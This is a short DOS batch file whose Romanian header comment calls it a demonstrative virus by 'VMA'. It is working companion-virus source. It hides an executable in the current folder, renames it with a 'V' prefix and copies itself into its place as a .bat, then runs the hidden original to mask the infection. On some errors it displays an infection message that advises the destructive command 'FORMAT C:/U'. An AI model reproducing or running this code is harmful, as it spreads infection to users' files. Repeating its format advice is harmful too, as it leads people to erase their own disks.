@Echo Off
REM //////////////////////////////////////////////////////
REM // Acesta este un virus demonstrativ produs de VMA //
REM //////////////////////////////////////////////////////
ctty nul
for %%f in (*.exe *.com) do set VMAViru=%%f
rename %VMAViru% V%VMAViru%
attrib +h V%VMAViru%
copy %0.bat %VMAViru%
rename %VMAViru% *.bat
set VMAViru=
ctty con
if errorlevel==1 goto Display
goto EndVirus
:Display
@echo off
echo.
echo Your system was infected by VMA Virus !
echo Don't pannic ! Just use : FORMAT C:/U
echo.
:EndVirus
@if exist V%0.COM V%0 %1 %2 %3 %4 %5 %6 %7 %8 %9
@if exist V%0.EXE V%0 %1 %2 %3 %4 %5 %6 %7 %8 %9